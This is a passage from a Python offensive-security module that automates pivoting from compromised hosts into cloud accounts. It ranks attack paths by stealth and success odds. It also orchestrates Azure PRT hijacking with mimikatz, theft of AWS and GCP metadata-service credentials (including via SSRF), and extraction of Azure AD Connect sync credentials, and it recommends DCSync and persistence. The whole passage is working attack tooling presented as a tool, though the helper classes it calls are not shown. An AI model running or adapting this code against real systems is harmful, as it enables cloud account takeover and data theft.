                name="AWS Role Chaining",
                description="Chain AssumeRole calls to escalate privileges",
                steps=[
                    {"action": "Start with initial role credentials", "technique": "T1078"},
                    {"action": "Enumerate assumable roles", "technique": "T1087.004"},
                    {"action": "Chain AssumeRole to higher privilege", "technique": "T1098"},
                    {"action": "Access protected resources", "technique": "T1530"},
                ],
                difficulty="medium",
                stealth_level="high",
                success_probability=0.65,
                required_access=["initial_aws_creds"],
                mitre_techniques=["T1078", "T1087.004", "T1098", "T1530"],
            ),
            
            # GCP paths
            CloudAttackPath(
                path_id="gcp_sa_token",
                name="GCP Service Account Token Theft",
                description="Steal tokens from GCP metadata service",
                steps=[
                    {"action": "Gain shell on GCE instance", "technique": "T1078"},
                    {"action": "Query metadata for token", "technique": "T1552.005"},
                    {"action": "Enumerate accessible APIs", "technique": "T1087.004"},
                    {"action": "Access GCS, BigQuery, etc", "technique": "T1530"},
                ],
                difficulty="easy",
                stealth_level="high",
                success_probability=0.85,
                required_access=["gce_shell"],
                mitre_techniques=["T1078", "T1552.005", "T1087.004", "T1530"],
            ),
            
            # Hybrid paths
            CloudAttackPath(
                path_id="hybrid_onprem_to_cloud",
                name="On-Prem to Cloud Full Chain",
                description="Complete lateral movement from on-prem AD to Azure AD",
                steps=[
                    {"action": "Compromise on-prem domain", "technique": "T1078"},
                    {"action": "Find Azure AD Connect server", "technique": "T1018"},
                    {"action": "Extract sync credentials", "technique": "T1003"},
                    {"action": "DCSync for cloud-synced users", "technique": "T1003.006"},
                    {"action": "Forge PRT or use password spray", "technique": "T1110"},
                    {"action": "Access Azure resources", "technique": "T1078.004"},
                ],
                difficulty="hard",
                stealth_level="medium",
                success_probability=0.70,
                required_access=["domain_user", "admin_access"],
                mitre_techniques=["T1078", "T1018", "T1003", "T1003.006", "T1110", "T1078.004"],
            ),
        ]
    
    def suggest_attack_path(
        self,
        current_access: List[str],
        target_provider: CloudProvider = None,
        stealth_preference: str = "medium"
    ) -> List[CloudAttackPath]:
        """
        Suggest attack paths based on current access
        
        Args:
            current_access: List of current access types
                            e.g., ["domain_user", "local_admin", "ec2_shell"]
            target_provider: Target cloud provider (optional)
            stealth_preference: low, medium, high
        
        Returns:
            List of applicable attack paths sorted by success probability
        """
        applicable_paths = []
        
        for path in self.attack_paths:
            # Check if we have required access
            has_access = any(
                access in current_access 
                for access in path.required_access
            )
            
            if not has_access:
                continue
            
            # Filter by provider if specified
            if target_provider:
                if target_provider == CloudProvider.AZURE and "azure" not in path.path_id:
                    continue
                if target_provider == CloudProvider.AWS and "aws" not in path.path_id:
                    continue
                if target_provider == CloudProvider.GCP and "gcp" not in path.path_id:
                    continue
            
            # Filter by stealth preference
            stealth_order = ["low", "medium", "high"]
            if stealth_order.index(path.stealth_level) >= stealth_order.index(stealth_preference):
                applicable_paths.append(path)
        
        # Sort by success probability
        applicable_paths.sort(key=lambda p: p.success_probability, reverse=True)
        
        return applicable_paths
    
    def get_weak_cloud_credentials(self, credentials: List[CloudCredential]) -> List[Dict[str, Any]]:
        """
        Analyze credentials for weaknesses
        
        Checks:
        - Overly permissive scopes
        - Long-lived tokens
        - Known weak app IDs
        - Missing MFA indicators
        """
        weak_creds = []
        
        for cred in credentials:
            weaknesses = []
            
            # Check Azure weak apps
            if cred.provider == CloudProvider.AZURE:
                if "client_id" in cred.metadata:
                    client_id = cred.metadata["client_id"]
                    if client_id in AZURE_WEAK_APPS:
                        weaknesses.append({
                            "type": "weak_app",
                            "description": f"Using weak app: {AZURE_WEAK_APPS[client_id]}",
                            "severity": "medium",
                        })
            
            # Check for overly permissive scopes
            dangerous_scopes = [
                "https://graph.microsoft.com/.default",
                "https://management.azure.com/.default",
                "Directory.ReadWrite.All",
                "RoleManagement.ReadWrite.Directory",
            ]
            
            for scope in cred.scope:
                if scope in dangerous_scopes:
                    weaknesses.append({
                        "type": "dangerous_scope",
                        "description": f"Overly permissive scope: {scope}",
                        "severity": "high",
                    })
            
            # Check token lifetime
            if cred.expires_at:
                remaining = (cred.expires_at - datetime.now()).total_seconds()
                if remaining > 86400:  # > 24 hours
                    weaknesses.append({
                        "type": "long_lived_token",
                        "description": f"Token valid for {remaining/3600:.1f} hours",
                        "severity": "low",
                    })
            
            if weaknesses:
                weak_creds.append({
                    "credential": cred.to_dict(),
                    "weaknesses": weaknesses,
                })
        
        return weak_creds


# =============================================================================
# CLOUD PIVOT ORCHESTRATOR
# =============================================================================

class CloudPivotOrchestrator:
    """
    Main orchestrator for cloud pivot operations
    
    Coordinates:
    - Azure PRT hijacking
    - AWS metadata relay
    - GCP token theft
    - Hybrid AD pivot
    - Attack path suggestion
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Initialize components
        self.azure_prt = AzurePRTHijacker(
            tenant_id=self.config.get("azure_tenant_id")
        )
        self.aws_metadata = AWSMetadataRelay()
        self.gcp_metadata = GCPMetadataExploiter()
        self.hybrid_pivot = HybridADPivot(
            domain=self.config.get("domain")
        )
        self.path_suggester = CloudAttackPathSuggester()
        
        # Credential store
        self.credentials: List[CloudCredential] = []
        self.pivot_history: List[PivotResult] = []
    
    async def auto_pivot(
        self,
        source_env: str = "onprem",
        target_provider: CloudProvider = None,
        stealth_level: str = "medium"
    ) -> List[PivotResult]:
        """
        Automatic cloud pivot based on current environment
        
        Detects environment and attempts appropriate pivots.
        """
        results = []
        
        logger.info(f"[PIVOT] Starting auto-pivot from {source_env}")
        
        # Detect cloud environment
        env_info = await self._detect_environment()
        logger.info(f"[PIVOT] Environment detection: {env_info}")
        
        # Try pivots based on environment
        if env_info.get("is_azure_ad_joined"):
            result = await self.pivot_azure_prt()
            if result.success:
                results.append(result)
        
        if env_info.get("is_ec2"):
            result = await self.pivot_aws_metadata()
            if result.success:
                results.append(result)
        
        if env_info.get("is_gce"):
            result = await self.pivot_gcp_metadata()
            if result.success:
                results.append(result)
        
        # Try hybrid pivot if on-prem
        if source_env == "onprem" and target_provider in [CloudProvider.AZURE, CloudProvider.HYBRID]:
            result = await self.pivot_hybrid_ad()
            if result.success:
                results.append(result)
        
        return results
    
    async def pivot_azure_prt(
        self,
        target: str = "localhost",
        method: str = "mimikatz"
    ) -> PivotResult:
        """
        Pivot via Azure PRT hijacking
        """
        logger.info(f"[PIVOT] Azure PRT pivot from {target}")
        
        try:
            # Extract PRT
            if method == "mimikatz":
                prt_context = await self.azure_prt.extract_prt_mimikatz(target, {})
            else:
                prt_context = await self.azure_prt.extract_prt_roadtools(target)
            
            if not prt_context:
                return PivotResult(
                    success=False,
                    method=PivotMethod.PRT_HIJACK,
                    source=target,
                    target="Azure AD",
                    error="Could not extract PRT",
                    recommendations=[
                        "Ensure target is Azure AD joined",
                        "Try ROADtools method",
                        "Check if user has active session",
                    ]
                )
            
            # Pass-the-PRT for Graph token
            credential = await self.azure_prt.pass_the_prt(
                prt_context,
                "https://graph.microsoft.com"
            )
            
            if credential:
                self.credentials.append(credential)
                
                result = PivotResult(
                    success=True,
                    method=PivotMethod.PRT_HIJACK,
                    source=target,
                    target="Azure AD",
                    credentials=credential,
                    attack_path=[
                        f"Extracted PRT from {target}",
                        "Derived session key",
                        "Created PRT cookie",
                        "Obtained Graph access token",
                    ],
                    recommendations=[
                        "Enumerate users/groups via Graph API",
                        "Check for privileged roles",
                        "Look for service principals with secrets",
                    ]
                )
                
                self.pivot_history.append(result)
                return result
            
        except Exception as e:
            logger.error(f"[PIVOT] Azure PRT pivot failed: {e}")
        
        return PivotResult(
            success=False,
            method=PivotMethod.PRT_HIJACK,
            source=target,
            target="Azure AD",
            error="PRT pivot failed",
        )
    
    async def pivot_aws_metadata(
        self,
        ssrf_url: str = None
    ) -> PivotResult:
        """
        Pivot via AWS metadata service
        """
        logger.info("[PIVOT] AWS metadata pivot")
        
        credentials = None
        method = PivotMethod.IMDS_V1
        
        try:
            # Try IMDSv1 first
            credentials = await self.aws_metadata.exploit_imdsv1()
            
            if not credentials:
                # Try IMDSv2
                credentials = await self.aws_metadata.exploit_imdsv2()
                method = PivotMethod.IMDS_V2
            
            if not credentials and ssrf_url:
                # Try SSRF relay
                credentials = await self.aws_metadata.ssrf_relay(ssrf_url)
                method = PivotMethod.SSRF_PIVOT
            
            if credentials:
                cloud_cred = CloudCredential(
                    provider=CloudProvider.AWS,
                    credential_type=TokenType.AWS_CREDS,
                    value=credentials.access_key_id,
                    metadata={
                        "secret_key": credentials.secret_access_key[:10] + "...",
                        "session_token": credentials.session_token[:20] + "...",
                        "role_arn": credentials.role_arn,
                    },
                    expires_at=credentials.expiration,
                    scope=["*"],
                    source=method.value,
                )
                
                self.credentials.append(cloud_cred)
                
                # Get instance identity for context
                identity = await self.aws_metadata.get_instance_identity()
                
                result = PivotResult(
                    success=True,
                    method=method,
                    source="EC2 Instance",
                    target="AWS Account",
                    credentials=cloud_cred,
                    attack_path=[
                        f"Accessed IMDS via {method.value}",
                        f"Retrieved IAM role: {credentials.role_arn}",
                        "Obtained temporary credentials",
                    ],
                    recommendations=[
                        "Enumerate S3 buckets",
                        "Check for assumable roles",
                        "Look for Lambda functions with secrets",
                        "Check EC2 user-data for credentials",
                    ]
                )
                
                if identity:
                    result.attack_path.append(f"Instance: {identity.get('instanceId')}")
                    result.attack_path.append(f"Account: {identity.get('accountId')}")
                
                self.pivot_history.append(result)
                return result
                
        except Exception as e:
            logger.error(f"[PIVOT] AWS metadata pivot failed: {e}")
        
        return PivotResult(
            success=False,
            method=method,
            source="EC2 Instance",
            target="AWS Account",
            error="Could not access metadata service",
            recommendations=[
                "Check if IMDSv2 is enforced",
                "Look for SSRF vulnerabilities",
                "Try from another EC2 instance",
            ]
        )
    
    async def pivot_gcp_metadata(self) -> PivotResult:
        """
        Pivot via GCP metadata service
        """
        logger.info("[PIVOT] GCP metadata pivot")
        
        try:
            # Get default service account token
            credentials = await self.gcp_metadata.get_access_token()
            
            if credentials:
                cloud_cred = CloudCredential(
                    provider=CloudProvider.GCP,
                    credential_type=TokenType.GCP_TOKEN,
                    value=credentials.access_token,
                    metadata={
                        "service_account": credentials.service_account,
                        "token_type": credentials.token_type,
                    },
                    expires_at=datetime.now() + timedelta(seconds=credentials.expires_in),
                    scope=credentials.scopes,
                    source="gcp_metadata",
                )
                
                self.credentials.append(cloud_cred)
                
                # Enumerate service accounts
                accounts = await self.gcp_metadata.enumerate_service_accounts()
                
                # Get project info
                project_info = await self.gcp_metadata.get_project_metadata()
                
                result = PivotResult(
                    success=True,
                    method=PivotMethod.METADATA_GCP,
                    source="GCE Instance",
                    target="GCP Project",
                    credentials=cloud_cred,
                    attack_path=[
                        "Accessed GCP metadata service",
                        f"Retrieved token for {credentials.service_account}",
                        f"Found {len(accounts)} service accounts",
                    ],
                    recommendations=[
                        "Enumerate GCS buckets",
                        "Check BigQuery datasets",
                        "Look for Cloud Functions",
                        "Check for other service account keys",
                    ]
                )
                
                if project_info:
                    result.attack_path.append(f"Project: {project_info.get('project_id')}")
                
                self.pivot_history.append(result)
                return result
                
        except Exception as e:
            logger.error(f"[PIVOT] GCP metadata pivot failed: {e}")
        
        return PivotResult(
            success=False,
            method=PivotMethod.METADATA_GCP,
            source="GCE Instance",
            target="GCP Project",
            error="Could not access GCP metadata service",
        )
    
    async def pivot_hybrid_ad(
        self,
        domain_controller: str = None,
        aad_connect_server: str = None
    ) -> PivotResult:
        """
        Hybrid AD pivot (on-prem to Azure)
        """
        logger.info("[PIVOT] Hybrid AD pivot")
        
        try:
            # Find Azure AD Connect
            aadc_info = await self.hybrid_pivot.find_azure_ad_connect(domain_controller)
            
            if aadc_info.get("found"):
                # Extract sync credentials
                sync_creds = await self.hybrid_pivot.extract_aadc_credentials(
                    aadc_info["server"]
                )
                
                if sync_creds:
                    result = PivotResult(
                        success=True,
                        method=PivotMethod.AAD_JOIN,
                        source="On-Premises AD",
                        target="Azure AD",
                        attack_path=[
                            f"Found AADC on {aadc_info['server']}",
                            f"Extracted sync account: {aadc_info['sync_account']}",
                            "Credentials allow DCSync to Azure AD",
                        ],
                        recommendations=[
                            "Use sync account for DCSync",
                            "Extract cloud-only user hashes",
                            "Set up persistence via password sync",
                        ]
                    )
                    
                    self.pivot_history.append(result)
                    return result
            
        except Exception as e:
            logger.error(f"[PIVOT] Hybrid AD pivot failed: {e}")
        
        return PivotResult(
            success=False,
            method=PivotMethod.AAD_JOIN,
            source="On-Premises AD",
            target="Azure AD",
            error="Could not find or exploit Azure AD Connect",
            recommendations=[
                "Look for ADFS server for Golden SAML",
                "Try device code phishing",
                "Check for Azure AD joined workstations",
            ]
        )
    
    async def _detect_environment(self) -> Dict[str, Any]:
        """Detect current cloud environment"""
        env = {
            "is_azure_ad_joined": False,
            "is_ec2": False,
            "is_gce": False,
            "is_azure_vm": False,
            "hostname": os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "")),
        }
        
        # Check Azure AD join
        # Windows: dsregcmd /status
        # ...
        
        # Check EC2
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    AWS_ENDPOINTS["metadata_v1"],
                    timeout=aiohttp.ClientTimeout(total=2)
                ) as resp:
                    if resp.status == 200:
                        env["is_ec2"] = True
        except:
            pass
        
        # Check GCE
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    GCP_ENDPOINTS["metadata"],
                    headers={"Metadata-Flavor": "Google"},
                    timeout=aiohttp.ClientTimeout(total=2)
                ) as resp:
                    if resp.status == 200:
                        env["is_gce"] = True
        except:
            pass
        
        return env
    
    def suggest_attack_path(
        self,
        current_access: List[str] = None,
        target_provider: CloudProvider = None
    ) -> List[Dict[str, Any]]:
        """
        Get AI-powered attack path suggestions
        
        Includes cloud weak credential analysis.
        """
        if current_access is None:
            current_access = ["domain_user"]
        
        # Get attack paths
        paths = self.path_suggester.suggest_attack_path(
            current_access=current_access,
            target_provider=target_provider,
        )
        
        # Get weak credential analysis
        weak_creds = self.path_suggester.get_weak_cloud_credentials(self.credentials)
        
        result = []
        for path in paths:
            result.append({
                "path_id": path.path_id,
                "name": path.name,
                "description": path.description,
                "steps": path.steps,
                "difficulty": path.difficulty,
                "stealth_level": path.stealth_level,
                "success_probability": path.success_probability,
                "mitre_techniques": path.mitre_techniques,
            })
        
        # Add weak creds info
        if weak_creds:
            result.append({
                "path_id": "weak_credentials",
                "name": "Weak Credential Exploitation",
                "description": "Exploit discovered weak cloud credentials",
                "weak_credentials": weak_creds,
                "difficulty": "easy",
                "success_probability": 0.90,
            })
        
        return result
    
    def get_pivot_summary(self) -> Dict[str, Any]:
        """Get summary of all pivot operations"""
        return {
            "total_pivots": len(self.pivot_history),
            "successful_pivots": len([p for p in self.pivot_history if p.success]),
            "credentials_obtained": len(self.credentials),
            "providers_accessed": list(set(c.provider.value for c in self.credentials)),
            "pivot_history": [p.to_dict() for p in self.pivot_history],
            "credentials": [c.to_dict() for c in self.credentials],
        }


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def create_cloud_pivot(config_path: str = None) -> CloudPivotOrchestrator:
    """Create cloud pivot orchestrator from config"""
    config = {}
    
    if config_path and os.path.exists(config_path):
        import yaml
        with open(config_path) as f:
            config = yaml.safe_load(f)
    
    return CloudPivotOrchestrator(config)


async def auto_cloud_pivot(
    source: str = "onprem",
    target: CloudProvider = None
) -> List[PivotResult]:
    """Quick auto-pivot function"""
    orchestrator = CloudPivotOrchestrator()
    return await orchestrator.auto_pivot(source, target)


def suggest_attack_path(
    current_access: List[str],
    target: CloudProvider = None
) -> List[Dict[str, Any]]:
    """Get attack path suggestions"""
    orchestrator = CloudPivotOrchestrator()
    return orchestrator.suggest_attack_path(current_access, target)


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Enums
    "CloudProvider",
    "PivotMethod",
    "TokenType",
    "AttackPhase",
    
    # Data classes
    "CloudCredential",
    "PRTContext",
    "AWSCredentials",
    "GCPCredentials",
    "PivotResult",
    "CloudAttackPath",
    
    # Classes
    "AzurePRTHijacker",
    "AWSMetadataRelay",
    "GCPMetadataExploiter",
    "HybridADPivot",
    "CloudAttackPathSuggester",
    "CloudPivotOrchestrator",
    
    # Functions
    "create_cloud_pivot",
    "auto_cloud_pivot",
    "suggest_attack_path",
]
